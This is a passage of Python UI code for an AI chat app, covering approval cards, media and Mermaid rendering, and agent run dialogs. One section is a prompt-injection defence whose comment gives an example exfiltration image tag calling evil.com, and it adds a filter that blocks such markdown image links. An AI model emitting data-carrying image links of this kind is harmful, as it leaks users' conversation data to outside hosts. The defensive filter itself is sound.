"""Row-Bot UI — message rendering helpers.

Pure UI builders — they create NiceGUI elements inside the current parent
context.  They receive ``state`` and ``p`` explicitly, never via closure.
"""

from __future__ import annotations

import base64 as _b64
import html as _html
import json as _json
import logging
import os
import pathlib
import re
import subprocess
import sys
import uuid as _uuid
from collections.abc import Callable
from datetime import datetime

from nicegui import ui
from row_bot.ui.state import P

logger = logging.getLogger(__name__)


_AGENT_RESULT_USE_STATUSES = {"completed", "completed_delivery_failed"}


def agent_result_use_prompt(run_id: str) -> str:
    """Build the normal parent-chat prompt used by Agent result card actions."""
    clean = str(run_id or "").strip()
    if not clean:
        return ""
    return f"what did agent {clean} find? use that result here"


def agent_result_use_available(run: dict) -> bool:
    """Return whether a child Agent card should offer an explicit use-result action."""
    run_id = str((run or {}).get("id") or "").strip()
    status = str((run or {}).get("status") or "").strip().lower()
    return bool(run_id) and status in _AGENT_RESULT_USE_STATUSES


def _load_pending_approval(
    *,
    approval_id: str = "",
    agent_run_id: str = "",
) -> dict | None:
    try:
        from row_bot.tasks import get_pending_approval_for_agent_run, get_pending_approvals

        if approval_id:
            rows = get_pending_approvals(approval_id=str(approval_id))
            return rows[0] if rows else None
        if agent_run_id:
            return get_pending_approval_for_agent_run(str(agent_run_id))
    except Exception:
        logger.debug("Could not load pending approval", exc_info=True)
    return None


def _render_approval_request_card(
    approval: dict | None,
    *,
    fallback_message: str = "",
    compact: bool = False,
) -> None:
    try:
        from row_bot.approval_messages import compact_message, payload_from_row
    except Exception:
        payload_from_row = None
        compact_message = None

    payload = payload_from_row(approval) if approval and payload_from_row else {}
    title = str(payload.get("title") or fallback_message or "Approval required.").strip()
    reason = str(payload.get("reason") or "").strip()
    raw_action = str(payload.get("raw_action") or "").strip()
    token = str((approval or {}).get("resume_token") or "")
    pending = bool(approval and token)

    if compact_message and payload:
        display_text = compact_message(payload, max_chars=360 if compact else 520)
    else:
        display_text = title
    if not pending:
        display_text = fallback_message or title or "This approval is no longer pending."

    with ui.column().classes("w-full gap-2 q-pa-sm").style(
        "border: 1px solid rgba(240, 192, 64, 0.38); "
        "border-radius: 8px; background: rgba(240, 192, 64, 0.08);"
    ):
        with ui.row().classes("w-full items-center gap-2 no-wrap"):
            ui.icon("verified_user", size="16px").classes("text-warning")
            ui.label(title or "Approval required").classes("text-sm font-semibold").style(
                "flex: 1; min-width: 0;"
            )
            if not pending:
                ui.badge("Handled", color="grey").props("outline dense")
        if reason:
            ui.label(f"Reason: {reason}").classes("text-xs text-grey-5").style(
                "white-space: normal;"
            )
        elif display_text and display_text != title:
            ui.label(display_text).classes("text-xs text-grey-5").style("white-space: pre-wrap;")
        if raw_action and not compact:
            ui.label(raw_action).classes("text-xs text-grey-6").style(
                "font-family: monospace; white-space: pre-wrap; overflow-wrap: anywhere;"
            )
        if pending:
            with ui.row().classes("w-full justify-end gap-2"):
                async def _respond(approved: bool, resume_token: str = token) -> None:
                    from nicegui import run as nicegui_run
                    from row_bot.tasks import respond_to_approval

                    ok = await nicegui_run.io_bound(
                        lambda: respond_to_approval(
                            resume_token,
                            approved,
                            source="desktop",
                        )
                    )
                    ui.notify(
                        "Approved" if ok and approved else "Denied" if ok else "Already handled",
                        type="positive" if ok and approved else "warning" if ok else "info",
                        close_button=True,
                    )

                async def _deny() -> None:
                    await _respond(False)

                async def _approve() -> None:
                    await _respond(True)

                ui.button("Deny", icon="close", on_click=_deny).props(
                    "flat dense no-caps color=negative"
                )
                ui.button("Approve", icon="check", on_click=_approve).props(
                    "unelevated dense no-caps color=positive"
                )

def _img_data_uri(b64: str) -> str:
    """Return a data URI with the correct MIME type for a base64-encoded image."""
    if b64.startswith("iVBOR"):
        return f"data:image/png;base64,{b64}"
    if b64.startswith("UklGR"):
        return f"data:image/webp;base64,{b64}"
    if b64.startswith("R0lGO"):
        return f"data:image/gif;base64,{b64}"
    return f"data:image/jpeg;base64,{b64}"


def _img_ext(b64: str) -> str:
    """Return the file extension for a base64-encoded image."""
    if b64.startswith("iVBOR"):
        return "png"
    if b64.startswith("UklGR"):
        return "webp"
    if b64.startswith("R0lGO"):
        return "gif"
    return "jpg"


def render_image_with_save(b64_or_fname: str, extra_style: str = "", thread_id: str | None = None) -> None:
    """Render an image thumbnail with a small save-to-disk button.

    Accepts either a base64 string or a media filename (loaded from disk).
    The download always delivers the **original full-resolution** bytes.
    """
    import base64 as _b64_mod
    from row_bot.ui.export import _save_export
    from datetime import datetime as _dt

    # Resolve filename → base64 if needed
    b64 = b64_or_fname
    from row_bot.utils.media import is_image_filename
    if thread_id and is_image_filename(b64_or_fname):
        from row_bot.threads import load_media_file
        raw = load_media_file(thread_id, b64_or_fname)
        if raw is None:
            ui.label("⚠ Image file not found").classes("text-xs text-grey-6")
            return
        b64 = _b64_mod.b64encode(raw).decode("ascii")

    data_uri = _img_data_uri(b64)
    ext = _img_ext(b64)
    style = "position: relative; display: inline-block;"
    if extra_style:
        style += f" {extra_style}"
    with ui.element("div").style(style):
        ui.image(data_uri).classes("w-80 rounded")
        # Capture b64 in closure for the click handler
        _b64_copy = b64

        def _save(b64_data=_b64_copy, extension=ext):
            ts = _dt.now().strftime("%Y%m%d_%H%M%S")
            raw = _b64_mod.b64decode(b64_data)
            _save_export(raw, f"row_bot_image_{ts}.{extension}")

        ui.button(
            icon="download", on_click=_save,
        ).props("flat dense round size=xs").classes(
            "absolute bottom-1 right-1"
        ).style(
            "background: rgba(0,0,0,0.5); color: white; min-width: 28px; "
            "min-height: 28px; padding: 2px;"
        ).tooltip("Save image")


def render_video_with_save(path_or_fname: str, thread_id: str | None = None) -> None:
    """Render an HTML5 video player with a download button.

    *path_or_fname* is either an absolute file path or a media filename
    (resolved via thread media).  The video is served through the
    ``/_media`` static route so the browser can stream it natively.
    """
    from html import escape as _html_escape
    from pathlib import Path as _Path
    from row_bot.ui.export import _save_export

    # Resolve to an absolute path
    abs_path: str | None = None
    if _Path(path_or_fname).is_absolute() and _Path(path_or_fname).exists():
        abs_path = path_or_fname
    elif thread_id:
        from row_bot.threads import _MEDIA_DIR
        candidate = _MEDIA_DIR / thread_id / path_or_fname
        if candidate.exists():
            abs_path = str(candidate)

    if not abs_path:
        ui.label("⚠ Video file not found").classes("text-xs text-grey-6")
        return

    # Build a URL through the /_media static route
    # Path format: /_media/<thread_id>/<filename>
    p = _Path(abs_path)
    # Extract thread_id/filename from the path (…/media/<thread_id>/<filename>)
    try:
        parts = p.parts
        # Find 'media' folder in path parts
        for i, part in enumerate(parts):
            if part == "media" and i + 2 < len(parts):
                tid = parts[i + 1]
                fname = parts[i + 2]
                video_url = f"/_media/{tid}/{fname}"
                break
        else:
            # Fallback: serve as absolute file URI
            video_url = p.as_uri() if hasattr(p, "as_uri") else f"file:///{abs_path}"
    except Exception:
        video_url = f"file:///{abs_path}"

    safe_video_url = _html_escape(video_url, quote=True)

    style = "position: relative; display: inline-block;"
    with ui.element("div").style(style):
        ui.html(
            f'<video controls preload="metadata" style="max-width: 480px; border-radius: 8px;">'
            f'<source src="{safe_video_url}" type="video/mp4">'
            f"Your browser does not support video playback.</video>",
            sanitize=False,
        )
        _path_copy = abs_path

        def _save(video_path=_path_copy):
            try:
                raw = _Path(video_path).read_bytes()
                from datetime import datetime as _dt
                ts = _dt.now().strftime("%Y%m%d_%H%M%S")
                _save_export(raw, f"row_bot_video_{ts}.mp4")
            except Exception:
                logger.warning("Failed to save video", exc_info=True)

        ui.button(
            icon="download", on_click=_save,
        ).props("flat dense round size=xs").classes(
            "absolute bottom-1 right-1"
        ).style(
            "background: rgba(0,0,0,0.5); color: white; min-width: 28px; "
            "min-height: 28px; padding: 2px;"
        ).tooltip("Save video")


# ── Bare-URL auto-linking ────────────────────────────────────────────
# Matches (in priority order) patterns we must *skip*, then bare URLs
# we want to convert.  Only capture-group 1 (bare URL) triggers a
# replacement; everything else is returned unchanged.
_AUTOLINK_RE = re.compile(
    r'```[\s\S]*?```'              # fenced code block  — skip
    r'|`[^`\n]+`'                  # inline code        — skip
    r'|\[[^\]]*\]\([^\)]+\)'       # markdown link      — skip
    r'|<https?://[^>]+>'           # angle-bracket link — skip
    r'|(https?://[^\s<>\)\]"\']+)',  # bare URL → group 1
)


def _autolink_replace(m: re.Match) -> str:
    url = m.group(1)
    if not url:
        return m.group(0)
    # Strip a single trailing punctuation that is almost certainly
    # sentence-ending rather than part of the URL.
    trail = ""
    if url[-1] in ".,;:!?":
        trail = url[-1]
        url = url[:-1]
    return f"[{url}]({url}){trail}"


def autolink_urls(text: str) -> str:
    """Wrap bare http(s) URLs in markdown link syntax.

    Preserves URLs already inside ``[text](url)``, ``<url>``, inline
    code, or fenced code blocks.
    """
    if "http" not in text:
        return text
    return _AUTOLINK_RE.sub(_autolink_replace, text)


# Matches a YouTube URL with optional surrounding markdown link + bold:
#   **[link text](https://youtube.com/watch?v=XXXXXXXXXXX)**
#   [label](https://youtu.be/XXXXXXXXXXX)
#   https://youtube.com/watch?v=XXXXXXXXXXX          (bare)
_YT_EMBED_RE = re.compile(
    r'\*{0,2}'                                        # optional leading **
    r'(?:\[([^\]]*)\]\()?'                            # optional [link text](
    r'https?://(?:www\.)?'
    r'(?:youtube\.com/(?:watch\?v=|shorts/)|youtu\.be/)'
    r'([a-zA-Z0-9_-]{11})'                           # video id
    r'[^\s)\]]*'                                      # trailing query params
    r'(?:\))?'                                        # optional closing )
    r'\*{0,2}',                                       # optional trailing **
)

_MERMAID_START_RE = re.compile(
    r"^(graph|flowchart|sequenceDiagram|classDiagram|erDiagram|journey|gantt|"
    r"stateDiagram(?:-v2)?|mindmap|timeline|pie)\b",
    re.IGNORECASE,
)

# Matches a fenced ```mermaid ... ``` block (after _auto_fence_mermaid has run)
_MERMAID_FENCE_RE = re.compile(
    r"^```mermaid\s*\n(.*?)\n```",
    re.MULTILINE | re.DOTALL,
)


def _is_mermaid_continuation_line(line: str) -> bool:
    """Return True if a line likely belongs to a Mermaid diagram body."""
    s = line.strip()
    if not s:
        return True
    lower = s.lower()
    if lower.startswith(
        (
            "graph ",
            "flowchart ",
            "sequencediagram",
            "classdiagram",
            "erdiagram",
            "journey",
            "gantt",
            "statediagram",
            "mindmap",
            "timeline",
            "pie",
            "subgraph",
            "end",
            "classdef ",
            "class ",
            "style ",
            "linkstyle ",
            "click ",
            "direction ",
            "%%",
        )
    ):
        return True
    if any(tok in s for tok in ("-->", "---", "-.->", "==>", "<--", "<->", ":::", "|", "[", "]", "(", ")", "{", "}")):
        return True
    return False


def _auto_fence_mermaid(text: str) -> str:
    """Wrap Mermaid plaintext in a fenced block when missing fences.

    Models sometimes output Mermaid syntax without ```mermaid fences,
    which prevents the UI mermaid renderer from detecting it.
    """
    if not text or "```mermaid" in text:
        return text

    lines = text.splitlines()
    start_idx = None
    for i, line in enumerate(lines):
        if _MERMAID_START_RE.match(line.strip()):
            start_idx = i
            break

    if start_idx is None:
        return text

    end_idx = len(lines)
    body_lines: list[str] = []
    for i in range(start_idx, len(lines)):
        line = lines[i]
        if _is_mermaid_continuation_line(line):
            body_lines.append(line)
        else:
            end_idx = i
            break

    mermaid_body = "\n".join(body_lines).strip()
    # Avoid false positives: Mermaid blocks generally include edges/subgraphs.
    if "-->" not in mermaid_body and "subgraph" not in mermaid_body.lower():
        return text

    prefix = "\n".join(lines[:start_idx]).rstrip()
    suffix = "\n".join(lines[end_idx:]).strip()
    fenced = f"```mermaid\n{mermaid_body}\n```"
    out_parts = []
    if prefix:
        out_parts.append(prefix)
    out_parts.append(fenced)
    if suffix:
        out_parts.append(suffix)
    return "\n\n".join(out_parts)


def _split_mermaid(parts: list[tuple[str, str | None]]) -> list[tuple[str, str | None]]:
    """Second pass: split any 'text' parts that contain fenced mermaid blocks."""
    out: list[tuple[str, str | None]] = []
    for kind, value in parts:
        if kind != "text" or not value or "```mermaid" not in value:
            out.append((kind, value))
            continue
        last = 0
        for m in _MERMAID_FENCE_RE.finditer(value):
            before = value[last:m.start()]
            if before.strip():
                out.append(("text", before))
            out.append(("mermaid", m.group(1)))
            last = m.end()
        tail = value[last:]
        if tail.strip():
            out.append(("text", tail))
    return out


def _render_mermaid_with_save(source: str) -> None:
    """Render a Mermaid diagram with a PNG export button."""

    from row_bot.ui.export import _save_export

    diagram_id = f"row_bot_mermaid_{_uuid.uuid4().hex}"
    safe_id = _json.dumps(diagram_id)
    safe_source = _html.escape(source)

    async def _save_png() -> None:
        try:
            result = await ui.run_javascript(
                f"""
                (async () => {{
                    const root = document.getElementById({safe_id});
                    if (!root) return {{ok: false, error: 'Diagram container is not available.'}};
                    let svg = root.querySelector('svg');
                    if (!svg && typeof mermaid !== 'undefined') {{
                        if (window.rowBotRenderMermaidDiagrams) {{
                            await window.rowBotRenderMermaidDiagrams(root);
                        }} else {{
                            await mermaid.run({{
                                nodes: root.querySelectorAll('pre.mermaid'),
                                suppressErrors: true,
                            }});
                        }}
                        svg = root.querySelector('svg');
                    }}
                    if (!svg) return {{ok: false, error: 'Diagram is not rendered yet.'}};
                    if (window.rowBotNormalizeMermaidDiagrams) {{
                        window.rowBotNormalizeMermaidDiagrams(root);
                    }}
                    const clone = svg.cloneNode(true);
                    clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
                    clone.setAttribute('xmlns:xlink', 'http://www.w3.org/1999/xlink');
                    function wrapLabelText(text, width) {{
                        const words = String(text || '').replace(/\\s+/g, ' ').trim().split(' ').filter(Boolean);
                        const maxChars = Math.max(8, Math.floor(Math.max(80, width || 160) / 7));
                        const lines = [];
                        let line = '';
                        words.forEach((word) => {{
                            const candidate = line ? `${{line}} ${{word}}` : word;
                            if (candidate.length > maxChars && line) {{
                                lines.push(line);
                                line = word;
                            }} else {{
                                line = candidate;
                            }}
                        }});
                        if (line) lines.push(line);
                        return lines.length ? lines : [''];
                    }}
                    clone.querySelectorAll('foreignObject').forEach((node) => {{
                        const label = String(node.innerText || node.textContent || '').replace(/\\s+/g, ' ').trim();
                        if (!label) {{
                            node.remove();
                            return;
                        }}
                        const x = Number(node.getAttribute('x') || 0);
                        const y = Number(node.getAttribute('y') || 0);
                        const w = Number(node.getAttribute('width') || 160);
                        const h = Number(node.getAttribute('height') || 44);
                        const text = document.createElementNS('http://www.w3.org/2000/svg', 'text');
                        text.setAttribute('x', String(x + w / 2));
                        text.setAttribute('y', String(y + h / 2));
                        text.setAttribute('text-anchor', 'middle');
                        text.setAttribute('dominant-baseline', 'central');
                        text.setAttribute('class', 'mermaid-export-label');
                        text.setAttribute('font-family', 'Inter, Segoe UI, Arial, sans-serif');
                        text.setAttribute('font-size', '16');
                        text.setAttribute('font-weight', '600');
                        text.setAttribute('fill', '#f2f2f2');
                        const lines = wrapLabelText(label, w);
                        lines.forEach((line, index) => {{
                            const tspan = document.createElementNS('http://www.w3.org/2000/svg', 'tspan');
                            tspan.setAttribute('x', String(x + w / 2));
                            tspan.setAttribute('dy', index === 0 ? `${{-0.55 * (lines.length - 1)}}em` : '1.1em');
                            tspan.textContent = line;
                            text.appendChild(tspan);
                        }});
                        node.replaceWith(text);
                    }});
                    clone.querySelectorAll('[href], [xlink\\\\:href]').forEach((node) => {{
                        const href = node.getAttribute('href') || node.getAttribute('xlink:href') || '';
                        if (/^https?:/i.test(href)) {{
                            node.removeAttribute('href');
                            node.removeAttribute('xlink:href');
                        }}
                    }});
                    const originalNodes = [svg, ...svg.querySelectorAll('*')];
                    const cloneNodes = [clone, ...clone.querySelectorAll('*')];
                    const styleProps = [
                        'fill', 'stroke', 'stroke-width', 'stroke-dasharray',
                        'opacity', 'color', 'font-family', 'font-size',
                        'font-weight', 'font-style', 'text-anchor',
                        'dominant-baseline', 'paint-order',
                    ];
                    cloneNodes.forEach((node, index) => {{
                        const original = originalNodes[index];
                        if (!original || !(original instanceof Element)) return;
                        const computed = window.getComputedStyle(original);
                        styleProps.forEach((prop) => {{
                            const value = computed.getPropertyValue(prop);
                            if (value) node.style.setProperty(prop, value);
                        }});
                    }});
                    const exportStyle = document.createElementNS('http://www.w3.org/2000/svg', 'style');
                    exportStyle.textContent = `
                        svg {{ background: #1e1e1e; color: #f2f2f2; }}
                        .node rect, .node polygon, .node circle, .node ellipse, .node path,
                        .stateGroup rect, .stateGroup polygon, .stateGroup path,
                        .cluster rect, .cluster polygon {{
                            fill: #252525 !important;
                            stroke: #d8d8d8 !important;
                            stroke-width: 1.5px !important;
                        }}
                        .nodeLabel, .nodeLabel p, .label, .label p,
                        text, tspan, .mermaid-export-label {{
                            fill: #f2f2f2 !important;
                            color: #f2f2f2 !important;
                            background: transparent !important;
                        }}
                        .edgePath path, .flowchart-link, .transition, .edge-thickness-normal,
                        path.transition, line.transition {{
                            stroke: #d0d0d0 !important;
                        }}
                        marker path, marker polygon {{
                            fill: #d0d0d0 !important;
                            stroke: #d0d0d0 !important;
                        }}
                        .edgeLabel, .edgeLabel p {{
                            color: #f2f2f2 !important;
                            background: #1e1e1e !important;
                        }}
                        .edgeLabel rect, .labelBkg {{
                            fill: #1e1e1e !important;
                            opacity: 0.94 !important;
                        }}
                    `;
                    clone.insertBefore(exportStyle, clone.firstChild);
                    const viewBox = svg.viewBox && svg.viewBox.baseVal;
                    const box = svg.getBoundingClientRect();
                    const bbox = svg.getBBox ? svg.getBBox() : null;
                    const intrinsicWidth = Math.max(
                        1,
                        Math.ceil(
                            Number(svg.dataset.rowBotIntrinsicWidth || 0) ||
                            (viewBox && viewBox.width) ||
                            (bbox && bbox.width) ||
                            box.width ||
                            1200
                        )
                    );
                    const intrinsicHeight = Math.max(
                        1,
                        Math.ceil(
                            Number(svg.dataset.rowBotIntrinsicHeight || 0) ||
                            (viewBox && viewBox.height) ||
                            (bbox && bbox.height) ||
                            box.height ||
                            800
                        )
                    );
                    const padding = 48;
                    const maxSide = 4096;
                    const minExportWidth = 1800;
                    const desiredScale = Math.max(3, minExportWidth / intrinsicWidth);
                    const scale = Math.max(
                        1,
                        Math.min(
                            desiredScale,
                            (maxSide - padding * 2) / intrinsicWidth,
                            (maxSide - padding * 2) / intrinsicHeight,
                        ),
                    );
                    const width = Math.ceil(intrinsicWidth * scale);
                    const height = Math.ceil(intrinsicHeight * scale);
                    clone.setAttribute('width', String(intrinsicWidth));
                    clone.setAttribute('height', String(intrinsicHeight));
                    if (!clone.getAttribute('viewBox')) {{
                        clone.setAttribute('viewBox', `0 0 ${{intrinsicWidth}} ${{intrinsicHeight}}`);
                    }}
                    const svgText = new XMLSerializer().serializeToString(clone);
                    const url = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svgText);
                    try {{
                        return await new Promise((resolve) => {{
                            const img = new Image();
                            img.decoding = 'async';
                            img.onload = () => {{
                                try {{
                                    const canvas = document.createElement('canvas');
                                    canvas.width = width + padding * 2;
                                    canvas.height = height + padding * 2;
                                    const ctx = canvas.getContext('2d');
                                    ctx.setTransform(1, 0, 0, 1, 0, 0);
                                    ctx.fillStyle = '#1e1e1e';
                                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                                    ctx.drawImage(img, padding, padding, width, height);
                                    resolve({{ok: true, dataUrl: canvas.toDataURL('image/png')}});
                                }} catch (err) {{
                                    resolve({{ok: false, error: err && err.message ? String(err.message) : 'Canvas export failed.'}});
                                }}
                            }};
                            img.onerror = () => {{
                                resolve({{ok: false, error: 'Could not rasterize diagram SVG.'}});
                            }};
                            img.src = url;
                        }});
                    }} catch (err) {{
                        return {{ok: false, error: err && err.message ? String(err.message) : 'Diagram export failed.'}};
                    }}
                }})()
                """,
                timeout=20,
            )
            data_url = result.get("dataUrl") if isinstance(result, dict) and result.get("ok") else None
            if not data_url or not isinstance(data_url, str) or "," not in data_url:
                message = result.get("error") if isinstance(result, dict) else ""
                ui.notify(message or "Diagram is not ready to save yet.", type="warning")
                return
            raw = _b64.b64decode(data_url.split(",", 1)[1])
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            _save_export(raw, f"row_bot_mermaid_{ts}.png")
        except Exception as exc:
            logger.debug("Mermaid PNG export failed", exc_info=True)
            ui.notify(f"Could not save diagram: {exc}", type="negative")

    with ui.element("div").style("position: relative; display: block;"):
        ui.html(
            f'<div id="{diagram_id}" class="mermaid-rendered">'
            f'<pre class="mermaid">{safe_source}</pre></div>',
            sanitize=False,
        )
        ui.button(
            icon="download",
            on_click=_save_png,
        ).props("flat dense round size=xs").classes(
            "absolute top-1 right-1"
        ).style(
            "background: rgba(0,0,0,0.55); color: white; min-width: 28px; "
            "min-height: 28px; padding: 2px; z-index: 2;"
        ).tooltip("Save diagram as PNG (up to 4K)")


# ── Prompt‑injection defence: markdown image exfiltration guard ──────────
# Matches ![alt](url) where the URL query/fragment is suspiciously long,
# which could be an attempt to exfiltrate conversation data via an
# auto-loading <img src="https://evil.com/log?data=..."> tag.
_EXFIL_IMG_RE = re.compile(
    r"!\[([^\]]*)\]"                     # ![alt text]
    r"\("                                # (
    r"(https?://[^)\s]+)"               # URL
    r"\)",                               # )
)
_B64_SEGMENT_RE_UI = re.compile(r"[A-Za-z0-9+/=]{100,}")


def _sanitize_exfil_images(text: str) -> str:
    """Replace markdown images whose URLs look like data‑exfiltration attempts.

    Suspicious images are converted to plain-text links so the content is
    still accessible but the browser won't auto-fire a request with
    embedded data in the query string.
    """
    def _check(m: re.Match) -> str:
        url = m.group(2)
        qmark = url.find("?")
        # Check query string length
        if qmark != -1 and len(url) - qmark > 200:
            alt = m.group(1) or "image"
            return f"⚠ *Blocked suspicious image link* — [{alt}]({url})"
        # Check for base64 segments in URL
        if _B64_SEGMENT_RE_UI.search(url):
            alt = m.group(1) or "image"
            return f"⚠ *Blocked suspicious image link* — [{alt}]({url})"
        return m.group(0)  # pass through unchanged
    return _EXFIL_IMG_RE.sub(_check, text)


LONG_MARKDOWN_PREVIEW_THRESHOLD = 16_000
LONG_MARKDOWN_PREVIEW_CHARS = 5_000


def _render_text_with_embeds_now(text: str) -> None:
    """Render markdown text with inline YouTube video embeds and mermaid diagrams."""
    if not text:
        return
    text = _sanitize_exfil_images(text)
    text = _auto_fence_mermaid(text)
    seen_yt: set[str] = set()
    last_end = 0
    parts: list[tuple[str, str | None]] = []
    for match in _YT_EMBED_RE.finditer(text):
        label = match.group(1)   # link text, or None if bare URL
        vid_id = match.group(2)
        # Text segment before this embed
        before = text[last_end:match.start()]
        if before.strip():
            parts.append(("text", before))
        # Optional link-text label above the embed
        if label:
            parts.append(("text", label))
        if vid_id not in seen_yt:
            seen_yt.add(vid_id)
            parts.append(("video", vid_id))
        last_end = match.end()
    # Remaining text after the last embed
    if last_end < len(text):
        tail = text[last_end:]
        if tail.strip():
            parts.append(("text", tail))
    # If no YouTube embeds were found, start with the full text as one part
    if not parts:
        parts = [("text", text)]
    # Second pass: extract fenced mermaid blocks from text parts
    parts = _split_mermaid(parts)
    # Render all parts
    for kind, value in parts:
        if kind == "text" and value and value.strip():
            ui.markdown(autolink_urls(value), extras=['code-friendly', 'fenced-code-blocks', 'tables']).classes("row-bot-msg w-full")
        elif kind == "video":
            ui.html(
                f'<iframe width="280" height="158" '
                f'src="https://www.youtube.com/embed/{value}" '
                f'frameborder="0" allowfullscreen '
                f'style="border-radius:8px;"></iframe>',
                sanitize=False,
            )
        elif kind == "mermaid" and value:
            _render_mermaid_with_save(value)


def render_text_with_embeds(text: str) -> None:
    """Render message text, deferring very large bodies until requested."""
    if not text:
        return
    if len(text) <= LONG_MARKDOWN_PREVIEW_THRESHOLD:
        _render_text_with_embeds_now(text)
        return

    preview = (
        text[:LONG_MARKDOWN_PREVIEW_CHARS].rstrip()
        + f"\n\n... ({len(text) - LONG_MARKDOWN_PREVIEW_CHARS:,} more characters)"
    )
    with ui.column().classes("w-full gap-2") as holder:
        _render_text_with_embeds_now(preview)

        def _show_full() -> None:
            holder.clear()
            with holder:
                _render_text_with_embeds_now(text)

        ui.button("Show full message", icon="unfold_more", on_click=_show_full).props(
            "flat dense no-caps"
        ).classes("self-start text-grey-5")


def _agent_status_color(status: str) -> str:
    return {
        "queued": "amber",
        "running": "primary",
        "waiting_approval": "warning",
        "waiting_user": "warning",
        "paused": "amber",
        "interrupted": "orange",
        "completed": "positive",
        "completed_delivery_failed": "warning",
        "failed": "negative",
        "blocked": "negative",
        "stopped": "orange",
        "cancelled": "orange",
        "timed_out": "negative",
    }.get(str(status or "").lower(), "grey-6")


def _short_text(value: object, limit: int = 180) -> str:
    text = str(value or "").strip()
    if len(text) <= limit:
        return text
    return text[: max(0, limit - 3)].rstrip() + "..."


def _agent_event_slug(event: dict) -> str:
    payload = event.get("payload_json") if isinstance(event, dict) else {}
    payload = payload if isinstance(payload, dict) else {}
    event_type = str(event.get("type") or "event").strip()
    detail = ""
    for key in (
        "summary",
        "status_message",
        "message",
        "objective",
        "tool",
        "path",
        "file",
        "error",
    ):
        value = payload.get(key)
        if value:
            detail = str(value)
            break
    if not detail and payload:
        detail = ", ".join(f"{k}={v}" for k, v in list(payload.items())[:3])
    ts = str(event.get("ts") or "").strip()
    stamp = ts[11:16] if len(ts) >= 16 else ""
    prefix = f"{stamp} " if stamp else ""
    if detail:
        return _short_text(f"{prefix}{event_type}: {detail}", 140)
    return _short_text(f"{prefix}{event_type}", 140)


def _extract_agent_artifacts(text: str) -> list[str]:
    if not text:
        return []
    candidates = re.findall(
        r"(?:[A-Za-z]:\\[^\n\r`'\"]+\.(?:pdf|docx|txt|md|csv|xlsx|png|jpg|jpeg|webp)|[A-Za-z0-9_. -]+\.(?:pdf|docx|txt|md|csv|xlsx|png|jpg|jpeg|webp))",
        text,
    )
    seen: set[str] = set()
    artifacts: list[str] = []
    for item in candidates:
        clean = item.strip().rstrip(".,;)")
        if clean and clean not in seen:
            seen.add(clean)
            artifacts.append(clean)
    return artifacts[:6]


def _agent_workspace_details(run: dict) -> dict[str, str]:
    run_id = str((run or {}).get("id") or "").strip()
    workspace = run.get("workspace") if isinstance(run.get("workspace"), dict) else {}
    mode = str(workspace.get("mode") or run.get("workspace_mode") or "")
    details = {
        "mode": mode,
        "branch": str(workspace.get("branch") or ""),
        "path": str(workspace.get("path") or run.get("workspace_path") or ""),
        "tooltip": "",
    }
    if mode == "worktree" and run_id and not details["branch"]:
        try:
            from row_bot.developer.worktrees import get_worktree_for_run

            worktree = get_worktree_for_run(run_id)
            if worktree:
                details["branch"] = str(worktree.get("branch_name") or "")
                details["path"] = str(worktree.get("worktree_path") or details["path"])
                metadata = worktree.get("metadata_json") or {}
                if metadata.get("seeded_from_current_changes"):
                    seeded = []
                    if metadata.get("seeded_staged_diff"):
                        seeded.append("staged")
                    if metadata.get("seeded_unstaged_diff"):
                        seeded.append("unstaged")
                    copied = metadata.get("seeded_untracked_files") or []
                    if copied:
                        seeded.append(f"{len(copied)} untracked")
                    details["seeded"] = "Inherited current changes: " + (", ".join(seeded) or "yes")
        except Exception:
            logger.debug("Could not load Agent worktree details", exc_info=True)
    details["tooltip"] = "\n".join(
        item for item in (details["branch"], details["path"], details.get("seeded", "")) if item
    ) or "Runs in its own local git Worktree."
    return details


def _open_folder_path(path: str) -> None:
    folder = pathlib.Path(str(path or "")).expanduser()
    if not folder.exists():
        ui.notify("Worktree folder does not exist.", type="warning", close_button=True)
        return
    try:
        if sys.platform.startswith("win"):
            os.startfile(str(folder))  # type: ignore[attr-defined]
        elif sys.platform == "darwin":
            subprocess.Popen(["open", str(folder)])
        else:
            subprocess.Popen(["xdg-open", str(folder)])
    except Exception as exc:
        logger.debug("Could not open Worktree folder", exc_info=True)
        ui.notify(f"Could not open Worktree: {exc}", type="negative", close_button=True)


def _open_agent_worktree(run: dict) -> None:
    details = _agent_workspace_details(run)
    path = details.get("path") or ""
    if not path:
        ui.notify("This Agent run has no Worktree path.", type="warning", close_button=True)
        return
    _open_folder_path(path)


def _show_agent_worktree_compare(run: dict) -> None:
    run_id = str((run or {}).get("id") or "").strip()
    if not run_id:
        ui.notify("Agent Run id is missing.", type="warning", close_button=True)
        return
    try:
        from row_bot.developer.worktrees import worktree_diff_summary

        summary = worktree_diff_summary("agent_run", run_id)
    except Exception as exc:
        logger.debug("Could not compare Agent Worktree", exc_info=True)
        ui.notify(f"Could not compare Worktree: {exc}", type="negative", close_button=True)
        return
    with ui.dialog() as dlg, ui.card().classes("q-pa-md").style(
        "width: min(720px, 94vw); border-radius: 8px;"
    ):
        with ui.row().classes("w-full items-center justify-between no-wrap"):
            ui.label("Compare Worktree").classes("text-h6")
            ui.button(icon="close", on_click=dlg.close).props("round flat dense")
        if not summary.get("ok"):
            ui.label(str(summary.get("error") or "Worktree compare failed.")).classes("text-sm text-negative")
        worktree = summary.get("worktree") if isinstance(summary.get("worktree"), dict) else {}
        if worktree:
            ui.label(str(worktree.get("worktree_path") or "")).classes("text-xs text-grey-6 ellipsis")
        status_lines = summary.get("status_lines") or []
        if status_lines:
            ui.code("\n".join(str(line) for line in status_lines)).classes("w-full text-xs")
        else:
            ui.label("No changed files detected in this Worktree.").classes("text-sm text-grey-6")
    dlg.open()


def open_agent_peek_dialog(
    run_or_id: dict | str,
    *,
    on_open_agent_thread: Callable[[dict], None] | None = None,
) -> None:
    """Open a compact read-only Agent detail dialog without leaving chat."""
    try:
        from row_bot.agent_runs import get_agent_events, get_agent_parent_messages, get_agent_run, stop_agent_run
        from row_bot.ui.helpers import load_thread_messages

        if isinstance(run_or_id, dict):
            run_row = run_or_id
            run_id = str(run_row.get("id") or "").strip()
            if run_id:
                run_row = get_agent_run(run_id) or run_row
        else:
            run_id = str(run_or_id or "").strip()
            run_row = get_agent_run(run_id) if run_id else None
        if not run_row:
            ui.notify("Agent Run not found.", type="warning", close_button=True)
            return
        run_id = str(run_row.get("id") or run_id or "").strip()
        status = str(run_row.get("status") or "unknown").strip()
        try:
            from row_bot.agent_orchestrator import agent_member_status_label

